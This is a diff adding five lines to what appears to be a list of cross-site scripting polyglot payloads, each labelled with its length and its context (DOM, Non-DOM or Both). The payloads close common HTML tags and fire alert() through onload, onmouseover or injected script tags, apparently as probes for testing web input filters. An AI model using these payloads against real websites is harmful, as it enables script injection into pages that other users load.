@@ -1,0 +1,5 @@
+141	Both	javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+88	Non-DOM	"'--></noscript></noembed></template></title></textarea></style><script>alert()</script>
+95	DOM	'"--></title></textarea></style></noscript></noembed></template></frameset><svg onload=alert()>
+54	Non-DOM	"'>-->*/</noscript></ti tle><script>alert()</script>
+42	DOM	"'--></style></script><svg oNload=alert()>
